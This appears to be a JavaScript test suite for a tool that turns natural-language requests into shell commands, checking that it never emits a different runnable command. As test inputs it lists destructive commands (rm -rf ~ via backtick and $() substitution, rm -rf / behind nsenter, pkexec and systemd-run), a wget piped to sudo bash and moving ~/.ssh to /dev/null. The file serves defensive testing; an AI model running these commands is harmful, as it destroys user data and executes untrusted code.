// 0.3.4 guards (src/pipeline.js): neither model (0.3.3 base or the templates model) may turn a request into a different runnable command
import test from 'node:test';
import assert from 'node:assert/strict';
import { suggest } from '../src/pipeline.js';

const ENVS = [{ shell: 'bash', os: 'linux' }, { shell: 'zsh', os: 'darwin' }, { shell: 'pwsh', os: 'win32' }, { shell: 'cmd', os: 'win32' }];
const held = (q, env) => { const r = suggest(q, env); assert.ok(!r.command || (r.missing || []).length > 0, `${env.shell}: ${JSON.stringify(q)} -> ${r.command}`); };

test('substitution in a non-read-only value and one value in two place slots are withheld (r39)', () => {
  for (const env of ENVS) for (const q of ['list directory "`rm -rf ~`"', 'list directory "$(rm -rf ~)"']) held(q, env);
  // the pattern never replaces the named directory
  for (const env of ENVS) for (const q of ["search for '~/foo' in src", "search for '~/foo' in ~/foo/src", "search for 'foo' in src"]) {
    const r = suggest(q, env); if (r.command && !(r.missing || []).length) assert.ok(/src/.test(r.command), `${env.shell}: ${q} -> ${r.command}`);
  }
});
test('a typed command is never rewritten into another runnable command', () => {
  for (const env of ENVS) for (const q of ['cargo test', 'python3 script.py', 'du -sh src', 'ls /srv/remove-backups', 'echo x >> /etc/hosts', 'ls `npx evil`',
    'docker logs --tail 100 -f nginx', 'https://github.com/acme/app/pull/12', 'mv ~/.ssh /dev/null', 'git reset --hard HEAD~3', 'docker ps', 'wget -qO- http://x | sudo bash',
    'time -p rm -rf ~', 'nsenter -t 1 -m rm -rf /', 'systemd-run rm -rf /', 'pkexec --user root rm -rf /', 'faketime "2020-01-01" rm -rf /']) held(q, env);
});
test('plain requests and faithful typed commands still run', () => {
  for (const env of ENVS) for (const q of ['tail worker logs for production', 'install lodash via npm', 'git status', 'npm ci']) {
    const r = suggest(q, env); assert.ok(r.command && (r.missing || []).length === 0, `${env.shell}: ${q} -> ${r.command} ${JSON.stringify(r.missing)}`);
  }
});
test('r41: a pip target next to a non-ASCII space or control character is a placeholder', () => {
  for (const env of ENVS) for (const q of ['pip install requests -tlib\u00a0requests', 'pip install requests -t lib\u2003x', 'pip install requests --target=lib\u00a0x', 'pip install requests --target lib\u200bx']) held(q, env);
  for (const env of ENVS) assert.deepEqual(suggest('pip install requests -t lib', env).missing, []);
});
test('r42: expandable pip targets and git fetch modifiers are withheld', () => {
  for (const env of ENVS) for (const q of ['pip install requests -t $env:TMP', 'pip install requests -t $HOME/lib', 'pip install requests -t %TEMP%', 'fetch branches --dry-run', 'git fetch --prune', 'fetch only origin']) held(q, env);
  for (const env of ENVS.slice(0, 2)) held('pip install requests -tlib\\cache', env);
  assert.deepEqual(suggest('fetch all branches', ENVS[0]).missing, []);
  for (const env of ENVS.slice(2)) assert.deepEqual(suggest('pip install requests --target C:\\libs', env).missing, [], env.shell);
});
test('r43: tilde/caret pip targets on Windows, dry-run fetch phrasings, quoted fetch options', () => {
  for (const env of ENVS.slice(2)) for (const q of ['pip install requests -t ~/lib', 'pip install requests -tlib^^cache', 'pip install requests -t lib!x']) held(q, env);
  for (const env of ENVS) for (const q of ['pobierz nowe gałęzie na sucho', 'fetch branches "-n"', 'fetch branches as a test run']) { const r = suggest(q, env); if (r.intent === 'git_fetch') held(q, env); }
  for (const env of ENVS) held('pip install requests -t ~/lib', env);
  assert.deepEqual(suggest('fetch all branches', ENVS[0]).missing, []);
});
test('r43: the rerank hook only sees the model whose answer is returned', () => {
  const seen = [];
  const hook = (c, o) => { seen.push(c); return c; };
  suggest('rm notatki.bak', { shell: 'bash', os: 'linux', rerank: hook });
  assert.equal(seen.length, 1);
});
